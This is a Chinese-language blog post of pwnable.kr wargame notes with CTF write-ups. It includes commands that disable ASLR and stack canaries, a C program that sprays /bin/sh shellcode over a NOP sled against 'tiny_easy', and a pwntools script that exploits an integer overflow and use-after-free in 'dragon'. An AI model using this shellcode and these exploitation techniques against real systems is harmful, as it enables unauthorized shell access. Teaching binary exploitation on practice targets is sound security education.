---
title: pwnable.kr笔记
date: 2017-08-13 15:23:28
tags:
- pwnable.kr
categories:
- [ctf]
- [security,pwn]
---

pwnable.kr算是pwn入门级别的题目，做一遍记录下大概的知识点。
<!-- more -->
# 大致流程

1. 检查软件的详细信息，得到是32位或64位的ELF。
```
checksec software
或
file software
或者
binwalk software
```
2. 运行软件，了解软件的流程，一般将软件拷贝到本地来调试方便些，可以通过(`scp`)[http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html] 命令。例如将`tiny_easy`拷贝到本地目录内，输入以下命令，再输入密码即可。

```
scp -P 2222  tiny_easy@pwnable.kr:/home/tiny_easy/tiny_easy .
```


3. 使用gdb工具调试软件
```
# 加载软件，不显示额外信息
gdb -q software
# 加载
```
关闭`alarm(0x38u);`
```
gdb-peda$ handle SIGALRM print nopass
Signal        Stop  Print   Pass to program Description
SIGALRM       No    Yes No      Alarm clock
```

将代码重新编译成可执行文件，关闭gcc编译器优化以启用缓冲区溢出。

1. 禁用ASLR
```
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

2. 禁用canary：
```
gcc overflow.c -o overflow -fno-stack-protector
```

## pwntools工具

### shellcode

通过(pwnlib.shellcraft)[http://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.syscall] 调用系统调用来生成`shellcode`:
``` python
print pwnlib.shellcraft.open('/home/pwn/flag').rstrip()
```



# [Toddler's Bottle]

## fd

## collision

## bof

## flag

	Papa brought me a packed present! let's open it.
	Download : http://pwnable.kr/bin/flag

	This is reversing task. all you need is binary

这道题说的很明确，对软件逆向，而且是个`packed`软件。


运行软件


## random

本题就考察的是对rand函数的理解。随机数生成器需要设置随机种子。如果rand未设置，rand会在调用时自动设置随机数种子为1。rand()产生的是伪随机数，每次执行的结果相同。若要不同，需要调用srand()初始化函数。
利用gdb调试，rand()每次确实生成相同的数`0x6b8b4567`。
所以可以利用异或得：
```
key = 0x6b8b4567^0xdeadbeef = 3039230856
```

## unlink


# [Rookiss]

## otp



## tiny_easy

### 思路

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

程序将所有保护措施关闭，关键代码
```
0x8048054:	pop    eax
0x8048055:	pop    edx
0x8048056:	mov    edx,DWORD PTR [edx]
0x8048058:	call   edx
```

通过`strace`查看错误发生在哪里。
```
➜  tiny_easy strace -if ./tiny_easy
[00007ff68ad5c047] execve("./tiny_easy", ["./tiny_easy"], [/* 66 vars */]) = 0
[69742f2e] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x69742f2e} ---
[????????????????] +++ killed by SIGSEGV +++
[1]    34625 segmentation fault  strace -if ./tiny_easy

```

### 解题

堆喷射，即在 argv[0] 里面放猜测的栈中的某个地址，然后跳到存在 argv[1…n] 里面的 shellcode. 用大量的滑行区来填充shellcode的前部。只要EIP能落在滑行区就可以执行shellcode。只要部署大量的带有滑行区的shellcode，多次尝试，肯定会有EIP落入滑行区的时候。

``` c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

char *shellcode = \
     "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
     "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
     "\x6e\x2f\x73\x68";

int main()
{
    char arg[130001];
    int status;
    memset(arg, '\x90', 130000);
    strcpy(arg + 130000 - strlen(shellcode), shellcode);

    for (;;) {
        if (0 == fork())
            execl("/home/tiny_easy/tiny_easy", "\xe0\xf0\x7c\xff",
                    arg, arg, arg, arg, arg, arg, arg, arg,
                    arg, arg, arg, arg, arg, arg, arg, arg,
                    NULL);
        wait(&status);
        if (WIFEXITED(status))
            break;
    }

    return 0;
}
```

## dragon

此题需要注意的是dragon结构体的定义。

```
    v5[1] = 1;
    *((_BYTE *)v5 + 8) = 80;
    *((_BYTE *)v5 + 9) = 4;
    v5[3] = 10;
    *v5 = PrintMonsterInfo;
```

得出的dragon结构体为
```
struct dragon{
	char * printDragonInfo;
	int type;
	char HP;
	char regeneration;
	int damage;
}
```

而英雄的结构体定义

	*ptr = 1;
    ptr[1] = 42;
    ptr[2] = 50;
    ptr[3] = PrintPlayerInfo;

```
struct hero{
	int type;
	int HP;
	int mp;
	char * printHeroInfo;
}
```


打龙时，胜利的条件是
	
	 1. *(_DWORD *)(ptrHero + 4) > 0 
	 2. *((_BYTE *)ptrDragon + 8) <= 0 

通过正常的流程英雄无法胜利，但是我们注意到，dragon的HP是`_BYTE_`类型，也就是有符号的字符型，可以通过汇编代码查看。
```
.text:08048AE6                 movzx   eax, byte ptr [eax+8]
.text:08048AEA                 test    al, al
.text:08048AEC                 jg      short loc_8048B00
```
`jg`表示有符号比较。

龙怪有个回血技能，可以让龙怪的`HP`增加，所以我们可以利用这一点，让`HP`超过127后溢出，变成负数。

这里选择的策略是，`mama dragon`，`priest`，3技能龙怪不攻击但是龙怪回血,2技能`priest`回蓝，组合为`332332332`。

还有注意，`dragon`出现是随机但是交替的，需要判断下。最后利用UAF返回到程序中已经给出的`system("/bin/sh");`。

```
from pwn import *

debug = False
if debug:
    p = process('./dragon')
    context.log_level="debug"
else:
    p = remote('pwnable.kr', 9004)

test='1332332'
commands='1332332332332'
print p.recv()
for c in test:
    p.sendline(c)
s = p.recvuntil('You Have Been Defeated!')
if s:
    for c in commands:
        p.sendline(c)
        print p.recv()
else:
    for c in ('332332'):
        p.sendline(c)
binsh=0x08048DBF

p.sendline(p32(binsh))

p.interactive()

```